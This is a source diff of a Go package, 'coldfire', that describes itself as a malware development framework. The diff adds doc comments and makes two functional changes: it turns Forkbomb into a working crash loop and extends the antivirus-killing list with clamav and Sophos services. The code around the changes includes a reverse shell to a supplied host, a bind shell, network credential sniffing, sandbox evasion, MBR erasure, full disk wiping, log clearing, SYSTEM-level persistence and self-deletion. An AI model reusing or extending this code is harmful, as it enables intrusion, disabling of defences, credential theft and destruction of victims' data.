@@ -1,3 +1,6 @@
+// Package coldfire is a framework that provides functions
+// for malware development that are mostly compatible with
+// Linux and Windows operating systems.
 package coldfire
 
 /*
@@ -104,6 +107,7 @@ var (
 	Yellow = color.New(color.FgYellow).SprintFunc()
 )
 
+// Revert returns a reversed string.
 func Revert(s string) string {
 	r := []rune(s)
 	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
@@ -112,6 +116,7 @@ func Revert(s string) string {
 	return string(r)
 }
 
+// IpIncrement increments an IP address by 1.
 func IpIncrement(ip net.IP) {
 	for j := len(ip) - 1; j >= 0; j-- {
 		ip[j]++
@@ -181,6 +186,7 @@ func getNTPTime() time.Time {
 // 	endSignal <- true
 // }
 
+// F is a wrapper for the Sprintf function.
 func F(str string, arg ...interface{}) string {
 	return fmt.Sprintf(str, arg...)
 }
@@ -189,30 +195,35 @@ func f(s string, arg ...interface{}) string {
 	return fmt.Sprintf(s, arg...)
 }
 
+// PrintGood is used to print output indicating success.
 func PrintGood(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
 	fmt.Printf("[%s] %s :: %s \n", Green(t), Green(Bold("[+]")), msg)
 }
 
+// PrintInfo is used to print output containing information.
 func PrintInfo(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
 	fmt.Printf("[%s] [*] :: %s\n", t, msg)
 }
 
+// PrintError is used to print output indicating failure.
 func PrintError(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
 	fmt.Printf("[%s] %s :: %s \n", Red(t), Red(Bold("[x]")), msg)
 }
 
+// PrintWarning is used to print output indicating potential failure.
 func PrintWarning(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
 	fmt.Printf("[%s] %s :: %s \n", Yellow(t), Yellow(Bold("[!]")), msg)
 }
 
+// FileToSlice reads a textfile and returns all lines as an array.
 func FileToSlice(file string) []string {
 	fil, _ := os.Open(file)
 	defer fil.Close()
@@ -224,6 +235,7 @@ func FileToSlice(file string) []string {
 	return lines
 }
 
+// Contains is used to check if an element exists in an array type agnostically.
 func Contains(s interface{}, elem interface{}) bool {
 	arrV := reflect.ValueOf(s)
 	if arrV.Kind() == reflect.Slice {
@@ -236,12 +248,14 @@ func Contains(s interface{}, elem interface{}) bool {
 	return false
 }
 
+// StrToInt converts a string into an integer.
 func StrToInt(string_integer string) int {
 	// i, _ := strconv.ParseInt(string_integer, 10, 32)
 	i, _ := strconv.Atoi(string_integer)
 	return i
 }
 
+// StrToWords returns a list of strings which was split by spaces.
 func StrToWords(s string) []string {
 	words := []string{}
 	gr := strings.Split(s, " ")
@@ -254,10 +268,12 @@ func StrToWords(s string) []string {
 	return words
 }
 
+// IntToStr converts an integer into a string.
 func IntToStr(i int) string {
 	return strconv.Itoa(i)
 }
 
+// SizeToBytes converts a human friendly string indicating size into a proper integer.
 func SizeToBytes(size string) int {
 	period_letter := string(size[len(size)-1])
 	intr := string(size[:len(size)-1])
@@ -273,10 +289,12 @@ func SizeToBytes(size string) int {
 	return i
 }
 
+// Alloc allocates memory without use.
 func Alloc(size string) {
 	_ = make([]byte, SizeToBytes(size))
 }
 
+// IntervalToSeconds converts a human friendly string indicating time into a proper integer.
 func IntervalToSeconds(interval string) int {
 	period_letter := string(interval[len(interval)-1])
 	intr := string(interval[:len(interval)-1])
@@ -293,6 +311,7 @@ func IntervalToSeconds(interval string) int {
 	return i
 }
 
+// GenCpuLoad gives the Cpu work to do by spawning goroutines.
 func GenCpuLoad(cores int, interval string, percentage int) {
 	runtime.GOMAXPROCS(cores)
 	unitHundresOfMicrosecond := 1000
@@ -317,36 +336,43 @@ func GenCpuLoad(cores int, interval string, percentage int) {
 	time.Sleep(t * time.Second)
 }
 
+// RandomInt returns an integer within a given range.
 func RandomInt(min int, max int) int {
 	rand.Seed(time.Now().UnixNano())
 	return rand.Intn(max-min) + min
 }
 
+// RandomSelectStr returns a string that was randomly selected from a list of strings.
 func RandomSelectStr(list []string) string {
 	rand.Seed(time.Now().UnixNano())
 	return list[rand.Intn(len(list))]
 }
 
+// RandomSelectStrNested returns a string array that was randomly selected from a nested list of strings
 func RandomSelectStrNested(list [][]string) []string {
 	rand.Seed(time.Now().UnixNano())
 	return list[rand.Intn(len(list))]
 }
 
+// RandomSelectInt returns an integer that was randomly selected from a list of integers.
 func RandomSelectInt(list []int) int {
 	rand.Seed(time.Now().UnixNano())
 	return list[rand.Intn(len(list))]
 }
 
+// RemoveNewLines removes possible newlines from a string.
 func RemoveNewlines(s string) string {
 	re := regexp.MustCompile(`\r?\n`)
 	s = re.ReplaceAllString(s, " ")
 	return s
 }
 
+// FullRemove removes all instances of a string from another string.
 func FullRemove(str string, to_remove string) string {
 	return strings.Replace(str, to_remove, "", -1)
 }
 
+// RemoveDuplicatesStr returns an array of strings that are unique to each other.
 func RemoveDuplicatesStr(slice []string) []string {
 	keys := make(map[string]bool)
 	list := []string{}
@@ -360,6 +386,7 @@ func RemoveDuplicatesStr(slice []string) []string {
 	return list
 }
 
+// RemoveDuplicatesInt returns an array of integers that are unique to each other.
 func RemoveDuplicatesInt(slice []int) []int {
 	keys := make(map[int]bool)
 	list := []int{}
@@ -373,6 +400,7 @@ func RemoveDuplicatesInt(slice []int) []int {
 	return list
 }
 
+// ContainsAny checks if a string exists within a list of strings.
 func ContainsAny(str string, elements []string) bool {
 	for element := range elements {
 		e := elements[element]
@@ -384,6 +412,7 @@ func ContainsAny(str string, elements []string) bool {
 	return false
 }
 
+// RandomString randomly generates an alphabetic string of a given length.
 func RandomString(n int) string {
 	rand.Seed(time.Now().UnixNano())
 	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
@@ -396,6 +425,7 @@ func RandomString(n int) string {
 	return string(b)
 }
 
+// ExitOnError prints a given error and then stops execution of the process.
 func ExitOnError(e error) {
 	if e != nil {
 		PrintError(e.Error())
@@ -403,6 +433,7 @@ func ExitOnError(e error) {
 	}
 }
 
+// RemoveFromSlice removes a string from a list of strings if it exists.
 func RemoveFromSlice(slice []string, element string) []string {
 	res := []string{}
 
@@ -415,6 +446,7 @@ func RemoveFromSlice(slice []string, element string) []string {
 	return res
 }
 
+// GetLocalIp is used to get the local Ip address of the machine.
 func GetLocalIp() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
@@ -423,6 +455,7 @@ func GetLocalIp() string {
 	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
 }
 
+// GetGlobalIp is used to return the global Ip address of the machine.
 func GetGlobalIp() string {
 	ip := ""
 	resolvers := []string{
@@ -450,6 +483,7 @@ func GetGlobalIp() string {
 	return ip
 }
 
+// GetGatewayIP returns the Ip address of the gateway in the network where the machine resides.
 func GetGatewayIP() string {
 	ip, err := gateway.DiscoverGateway()
 	ExitOnError(err)
@@ -457,6 +491,7 @@ func GetGatewayIP() string {
 	return ip.String()
 }
 
+// Iface returns the currently used wireless interface and its MAC address.
 func Iface() (string, string) {
 	current_iface := ""
 	interfaces, err := net.Interfaces()
@@ -483,6 +518,7 @@ func Iface() (string, string) {
 	return name, hwAddr.String()
 }
 
+// Ifaces returns the names of all local interfaces.
 func Ifaces() []string {
 	ifs := []string{}
 	interfaces, _ := net.Interfaces()
@@ -494,6 +530,9 @@ func Ifaces() []string {
 	return ifs
 }
 
+// Info is used to return basic system information.
+// Note that if information can not be resolved in a
+// specific field it returns "N/A"
 func Info() map[string]string {
 	_, mac := Iface()
 	var (
@@ -568,6 +607,7 @@ func Info() map[string]string {
 	return inf
 }
 
+// MD5Hash hashes a given string using the MD5.
 func MD5Hash(str string) string {
 	hasher := md5.New()
 	hasher.Write([]byte(str))
@@ -575,6 +615,7 @@ func MD5Hash(str string) string {
 	return hex.EncodeToString(hasher.Sum(nil))
 }
 
+// CreateWordList generates possible variations of each word in the wordlist.
 func CreateWordlist(words []string) []string {
 	wordlist := []string{}
 	for w := range words {
@@ -594,6 +635,7 @@ func CreateWordlist(words []string) []string {
 	return wordlist
 }
 
+// ReadFile is used to read a given file and return its data as a string.
 func ReadFile(filename string) (string, error) {
 	fil, err := os.Open(filename)
 	if err != nil {
@@ -609,6 +651,7 @@ func ReadFile(filename string) (string, error) {
 	return string(b), nil
 }
 
+// WriteFile is used to write data into a given file.
 func WriteFile(filename, data string) error {
 	file, err := os.Create(filename)
 	if err != nil {
@@ -624,6 +667,8 @@ func WriteFile(filename, data string) error {
 	return nil
 }
 
+// FilesPattern is used to return data mapped to files
+// where their filenames match a given pattern.
 func FilesPattern(directory, pattern string) (map[string]string, error) {
 	out_map := map[string]string{}
 	files, err := ioutil.ReadDir(directory)
@@ -649,16 +694,19 @@ func FilesPattern(directory, pattern string) (map[string]string, error) {
 	return out_map, nil
 }
 
+// B64D decodes a given string encoded in Base64.
 func B64D(str string) string {
 	raw, _ := base64.StdEncoding.DecodeString(str)
 
 	return fmt.Sprintf("%s", raw)
 }
 
+// B64E encodes a string in Base64.
 func B64E(str string) string {
 	return base64.StdEncoding.EncodeToString([]byte(str))
 }
 
+// Wait uses a human friendly string that indicates how long a system should wait.
 func Wait(interval string) {
 	period_letter := string(interval[len(interval)-1])
 	intr := string(interval[:len(interval)-1])
@@ -685,14 +733,19 @@ func Wait(interval string) {
 //     }
 // }
 
+// Forkbomb spawns goroutines in order to crash the machine.
 func Forkbomb() {
-	go Forkbomb() // won't work, spawns only single green thread
+	for {
+		go Forkbomb()
+	}
 }
 
+// Remove is used to self delete.
 func Remove() {
 	os.Remove(os.Args[0])
 }
 
+// Exists checks if a given file is in the system.
 func Exists(file string) bool {
 	_, err := os.Stat(file)
 	if err != nil {
@@ -703,6 +756,7 @@ func Exists(file string) bool {
 	return true
 }
 
+// IsRoot checks if the current user is the administrator of the machine.
 func IsRoot() bool {
 	root := true
 
@@ -720,6 +774,7 @@ func IsRoot() bool {
 	return root
 }
 
+// CmdOut executes a given command and returns its output.
 func CmdOut(command string) (string, error) {
 	switch runtime.GOOS {
 	case "windows":
@@ -766,6 +821,7 @@ func CmdOut(command string) (string, error) {
 //     return b.String(), err
 // }
 
+// CmdOutPlatform executes a given set of commands based on the OS of the machine.
 func CmdOutPlatform(commands map[string]string) (string, error) {
 	cmd := commands[runtime.GOOS]
 	out, err := CmdOut(cmd)
@@ -776,6 +832,8 @@ func CmdOutPlatform(commands map[string]string) (string, error) {
 	return out, nil
 }
 
+// CmdRun executes a command and writes output as well
+// as error to STDOUT.
 func CmdRun(command string) {
 	parts := strings.Fields(command)
 	head := parts[0]
@@ -792,6 +850,7 @@ func CmdRun(command string) {
 	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
+// CmdBlind runs a command without any side effects.
 func CmdBlind(command string) {
 	parts := strings.Fields(command)
 	head := parts[0]
@@ -801,6 +860,8 @@ func CmdBlind(command string) {
 	// ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
+// CmdDir executes commands which are mapped to a string
+// indicating the directory where the command is executed.
 func CmdDir(dirs_cmd map[string]string) ([]string, error) {
 	outs := []string{}
 	for dir, cmd := range dirs_cmd {
@@ -819,6 +880,7 @@ func CmdDir(dirs_cmd map[string]string) ([]string, error) {
 	return outs, nil
 }
 
+// MakeZip packs a list of given files within a zip archive.
 func MakeZip(zip_file string, files []string) error {
 	newZipFile, err := os.Create(zip_file)
 	if err != nil {
@@ -858,6 +920,8 @@ func MakeZip(zip_file string, files []string) error {
 	return nil
 }
 
+// CredentialsSniff is used to sniff network traffic for
+// private user information.
 func CredentialsSniff(ifac, interval string,
 	collector chan string,
 	words []string) error {
@@ -901,6 +965,8 @@ func CredentialsSniff(ifac, interval string,
 	return nil
 }
 
+// SandboxFilePath checks if the process is being run
+// inside a virtualized environment.
 func SandboxFilepath() bool {
 	if runtime.GOOS == "linux" {
 		out, _ := CmdOut("systemd-detect-virt")
@@ -936,6 +1002,8 @@ func SandboxFilepath() bool {
 	}
 }
 
+// SandboxProc checks if there are processes that indicate
+// a virtualized environment.
 func SandboxProc() bool {
 	sandbox_processes := []string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
 		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
@@ -950,6 +1018,8 @@ func SandboxProc() bool {
 	return false
 }
 
+// SandboxSleep is used to check if the virtualized environment
+// is speeding up the sleeping process.
 func SandboxSleep() bool {
 	z := false
 	firstTime := getNTPTime()
@@ -963,6 +1033,8 @@ func SandboxSleep() bool {
 	return z
 }
 
+// SandboxDisk is used to check if the environment's
+// disk space is less than a given size.
 func SandboxDisk(size int) bool {
 	v := false
 	d := "/"
@@ -983,6 +1055,8 @@ func SandboxDisk(size int) bool {
 	return v
 }
 
+// SandboxCpu is used to check if the environment's
+// cores are less than a given integer.
 func SandboxCpu(cores int) bool {
 	x := false
 	num_procs := runtime.NumCPU()
@@ -992,6 +1066,8 @@ func SandboxCpu(cores int) bool {
 	return x
 }
 
+// SandboxRam is used to check if the environment's
+// RAM is less than a given size.
 func SandboxRam(ram_mb int) bool {
 	var m runtime.MemStats
 	runtime.ReadMemStats(&m)
@@ -1001,12 +1077,16 @@ func SandboxRam(ram_mb int) bool {
 	return ram < rmb
 }
 
+// SandboxUtc is used to check if the environment
+// is in a properly set Utc timezone.
 func SandboxUtc() bool {
 	_, offset := time.Now().Zone()
 
 	return offset == 0
 }
 
+// SandboxProcnum is used to check if the environment
+// has processes less than a given integer.
 func SandboxProcnum(proc_num int) bool {
 	processes, err := ps.Processes()
 	if err != nil {
@@ -1016,6 +1096,8 @@ func SandboxProcnum(proc_num int) bool {
 	return len(processes) < proc_num
 }
 
+// SandboxTmp is used to check if the environment's
+// temporary directory has less files than a given integer.
 func SandboxTmp(entries int) bool {
 	tmp_dir := "/tmp"
 	if runtime.GOOS == "windows" {
@@ -1029,6 +1111,8 @@ func SandboxTmp(entries int) bool {
 	return len(files) < entries
 }
 
+// SandboxMac is used to check if the environment's MAC address
+// matches standard MAC adddresses of virtualized environments.
 func SandboxMac() bool {
 	hits := 0
 	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
@@ -1046,6 +1130,8 @@ func SandboxMac() bool {
 	return hits == 0
 }
 
+// SandboxAll is used to check if an environment is virtualized
+// by testing all sandbox checks.
 func SandboxAll() bool {
 	values := []bool{
 		SandboxProc(),
@@ -1069,6 +1155,9 @@ func SandboxAll() bool {
 	return false
 }
 
+// SandboxAlln checks if an environment is virtualized by testing all
+// sandbox checks and checking if the number of successful checks is
+// equal or greater to a given integer.
 func SandboxAlln(num int) bool {
 	num_detected := 0
 	values := []bool{
@@ -1093,6 +1182,7 @@ func SandboxAlln(num int) bool {
 	return num_detected >= num
 }
 
+// Shutdown forces the machine to shutdown.
 func Shutdown() error {
 	commands := map[string]string{
 		"windows": "shutdown -s -t 60",
@@ -1121,6 +1211,8 @@ func Shutdown() error {
 // 	c.Start()
 // }
 
+// Bind tells the process to listen to a local port
+// for commands.
 func Bind(port int) {
 	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
 	ExitOnError(err)
@@ -1135,6 +1227,7 @@ func Bind(port int) {
 	}
 }
 
+// Reverse initiates a reverse shell to a given host:port.
 func Reverse(host string, port int) {
 	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 	ExitOnError(err)
@@ -1144,11 +1237,13 @@ func Reverse(host string, port int) {
 	}
 }
 
+// PkillPid kills a process by its PID.
 func PkillPid(pid int) error {
 	err := killProcByPID(pid)
 	return err
 }
 
+// PkillName kills a process by its name.
 func PkillName(name string) error {
 	processList, err := ps.Processes()
 	if err != nil {
@@ -1170,6 +1265,7 @@ func PkillName(name string) error {
 	return nil
 }
 
+// PkillAv kills Anti-Virus processes that may run within the machine.
 func PkillAv() error {
 	var av_processes []string
 	windows_av_processes := []string{
@@ -1182,7 +1278,7 @@ func PkillAv() error {
 		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
 		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
 		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}
-	unix_av_processes := []string{"netsafety"}
+	unix_av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}
 
 	if runtime.GOOS == "windows" {
 		av_processes = windows_av_processes
@@ -1211,6 +1307,7 @@ func PkillAv() error {
 	return nil
 }
 
+// Processes returns a map of a PID to its respective process name.
 func Processes() (map[int]string, error) {
 	prs := make(map[int]string)
 	processList, err := ps.Processes()
@@ -1226,6 +1323,7 @@ func Processes() (map[int]string, error) {
 	return prs, nil
 }
 
+// Portscan checks for open ports in a given target.
 func Portscan(target string, timeout, threads int) (pr []int) {
 	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
 	opened_ports := ps.GetOpenedPort(0, 65535)
@@ -1238,6 +1336,7 @@ func Portscan(target string, timeout, threads int) (pr []int) {
 	return
 }
 
+// PortscanSingle checks if a specific port is open in a given target.
 func PortscanSingle(target string, port int) bool {
 	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
 	opened_ports := ps.GetOpenedPort(port-1, port+1)
@@ -1245,6 +1344,7 @@ func PortscanSingle(target string, port int) bool {
 	return len(opened_ports) != 0
 }
 
+// Bannergrab returns a service banner string from a given port.
 func BannerGrab(target string, port int) (string, error) {
 	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
 	if err != nil {
@@ -1264,6 +1364,7 @@ func BannerGrab(target string, port int) (string, error) {
 	return string(banner), nil
 }
 
+// SendDataTCP sends data to a given host:port using the TCP protocol.
 func SendDataTCP(host string, port int, data string) error {
 	addr := host + ":" + strconv.Itoa(port)
 	conn, err := net.Dial("tcp", addr)
@@ -1279,6 +1380,7 @@ func SendDataTCP(host string, port int, data string) error {
 	return nil
 }
 
+// SendDataUDP sends data to a given host:port using the UDP protocol.
 func SendDataUDP(host string, port int, data string) error {
 	addr := host + ":" + strconv.Itoa(port)
 	conn, err := net.Dial("udp", addr)
@@ -1295,6 +1397,7 @@ func SendDataUDP(host string, port int, data string) error {
 	return nil
 }
 
+// FilePermissions checks if a given file has read and write permissions.
 func FilePermissions(filename string) (bool, bool) {
 	write_permission := true
 	read_permission := true
@@ -1310,6 +1413,7 @@ func FilePermissions(filename string) (bool, bool) {
 	return read_permission, write_permission
 }
 
+// Download downloads a file from a url.
 func Download(url string) error {
 	splitted := strings.Split(url, "/")
 	filename := splitted[len(splitted)-1]
@@ -1334,6 +1438,7 @@ func Download(url string) error {
 	return nil
 }
 
+// Users returns a list of known users within the machine.
 func Users() ([]string, error) {
 	switch runtime.GOOS {
 	case "windows":
@@ -1373,6 +1478,7 @@ func Users() ([]string, error) {
 	}
 }
 
+// EraseMbr zeroes out the Master Boot Record.
 func EraseMbr(device string, partition_table bool) error {
 	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
 	if partition_table {
@@ -1387,6 +1493,7 @@ func EraseMbr(device string, partition_table bool) error {
 	return nil
 }
 
+// Networks returns a list of nearby wireless networks.
 func Networks() ([]string, error) {
 	wifi_names := []string{}
 
@@ -1420,6 +1527,7 @@ func Networks() ([]string, error) {
 	return wifi_names, nil
 }
 
+// ExpandCidr returns a list of Ip addresses within a given CIDR.
 func ExpandCidr(cidr string) ([]string, error) {
 	ip, ipnet, err := net.ParseCIDR(cidr)
 	if err != nil {
@@ -1440,6 +1548,7 @@ func ExpandCidr(cidr string) ([]string, error) {
 	}
 }
 
+// ClearLogs removes logfiles within the machine.
 func ClearLogs() error {
 	switch runtime.GOOS {
 	case "windows":
@@ -1458,6 +1567,7 @@ func ClearLogs() error {
 	return nil
 }
 
+// Wipe deletes all data in the machine.
 func Wipe() error {
 	cmd := ""
 	switch runtime.GOOS {
@@ -1474,6 +1584,7 @@ func Wipe() error {
 	return nil
 }
 
+// DnsLookup returns the list of Ip adddress associated with the given hostname.
 func DnsLookup(hostname string) ([]string, error) {
 	i := []string{}
 	ips, err := net.LookupIP(hostname)
@@ -1488,6 +1599,7 @@ func DnsLookup(hostname string) ([]string, error) {
 	return i, nil
 }
 
+// RdnsLookup returns the list of hostnames associated with the given Ip address.
 func RdnsLookup(ip string) ([]string, error) {
 	ips, err := net.LookupAddr(ip)
 	if err != nil {
@@ -1496,6 +1608,7 @@ func RdnsLookup(ip string) ([]string, error) {
 	return ips, nil
 }
 
+// CreateUser creates a user with a given username and password.
 func CreateUser(username, password string) error {
 	var cmd string
 
@@ -1515,6 +1628,7 @@ func CreateUser(username, password string) error {
 	return nil
 }
 
+// WifiDisconnect is used to disconnect the machine from a wireless network.
 func WifiDisconnect() error {
 	var cmd string
 
@@ -1544,6 +1658,7 @@ func WifiDisconnect() error {
 
 }
 
+// Disks returns a list of storage drives within the machine.
 func Disks() ([]string, error) {
 	found_drives := []string{}
 
@@ -1569,6 +1684,7 @@ func Disks() ([]string, error) {
 	return found_drives, nil
 }
 
+// CopyFile copies a file from one directory to another.
 func CopyFile(src, dst string) error {
 	sourceFileStat, err := os.Stat(src)
 	if err != nil {
@@ -1595,6 +1711,7 @@ func CopyFile(src, dst string) error {
 	return err
 }
 
+// TraverseCurrentDir lists all files that exist within the current directory.
 func TraverseCurrentDir() ([]string, error) {
 	files_in_dir := []string{}
 	files, err := ioutil.ReadDir(".")
@@ -1609,6 +1726,7 @@ func TraverseCurrentDir() ([]string, error) {
 	return files_in_dir, nil
 }
 
+// TraverseDir lists all files that exist within a given directory.
 func TraverseDir(dir string) ([]string, error) {
 	files_in_dir := []string{}
 	files, err := ioutil.ReadDir(dir)
@@ -1623,6 +1741,7 @@ func TraverseDir(dir string) ([]string, error) {
 	return files_in_dir, nil
 }
 
+// RemoveStr removes a given string from a list of strings.
 func RemoveStr(slice []string, s string) []string {
 	final := []string{}
 	for _, e := range slice {
@@ -1634,6 +1753,7 @@ func RemoveStr(slice []string, s string) []string {
 	return final
 }
 
+// RemoveInt removes a given integer from a list of integers.
 func RemoveInt(slice []int, s int) []int {
 	final := []int{}
 	for _, e := range slice {
@@ -1645,6 +1765,7 @@ func RemoveInt(slice []int, s int) []int {
 	return final
 }
 
+// AddPersistentCommand creates a task that runs a given command on startup.
 func AddPersistentCommand(cmd string) error {
 	if runtime.GOOS == "windows" {
 		_, err := CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
@@ -1655,6 +1776,7 @@ func AddPersistentCommand(cmd string) error {
 	}
 }
 
+// RegexMatch checks if a string contains valuable information through regex.
 func RegexMatch(regex_type, str string) bool {
 	regexes := map[string]string{
 		"mail":   "^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$",
@@ -1673,6 +1795,7 @@ func RegexMatch(regex_type, str string) bool {
 	return len(matches) != 0
 }
 
+// ShuffleSlice randomly shuffles a list of strings.
 func ShuffleSlice(s []string) []string {
 	rand.Seed(time.Now().UnixNano())
 	rand.Shuffle(len(s), func(i, j int) {
@@ -1682,18 +1805,21 @@ func ShuffleSlice(s []string) []string {
 	return s
 }
 
+// StartNgrokTCP exposes a TCP server on a given port.
 func StartNgrokTCP(port int) error {
 	_, err := CmdOut(F("ngrok tcp %d", port))
 
 	return err
 }
 
+// StartNgrokHTTP exposes a web server on a given port.
 func StartNgrokHTTP(port int) error {
 	_, err := CmdOut(F("ngrok http %d", port))
 
 	return err
 }
 
+// GetNgrokURL returns the URL of the Ngrok tunnel exposing the machine.
 func GetNgrokURL() (string, error) {
 	local_url := "http://localhost:4040/api/tunnels"
 	resp, err := http.Get(local_url)
@@ -1719,6 +1845,7 @@ func GetNgrokURL() (string, error) {
 	return json_sanitized, nil
 }
 
+// ExtractIntFromString extracts a list of possible integers from a given string.
 func ExtractIntFromString(s string) []int {
 	res := []int{}
 	re := regexp.MustCompile(`[-]?\d[\d,]*[\.]?[\d{2}]*`)
@@ -1732,6 +1859,7 @@ func ExtractIntFromString(s string) []int {
 	return res
 }
 
+// Splitjoin splits a string then joins them using given delimiters.
 func SplitJoin(s, splitter, joiner string) string {
 	splitted := strings.Split(s, splitter)
 	joined := strings.Join(splitted, joiner)
@@ -1739,6 +1867,7 @@ func SplitJoin(s, splitter, joiner string) string {
 	return joined
 }
 
+// RevertSlice reverses a slice type agnostically.
 func RevertSlice(s interface{}) {
 	n := reflect.ValueOf(s).Len()
 	swap := reflect.Swapper(s)
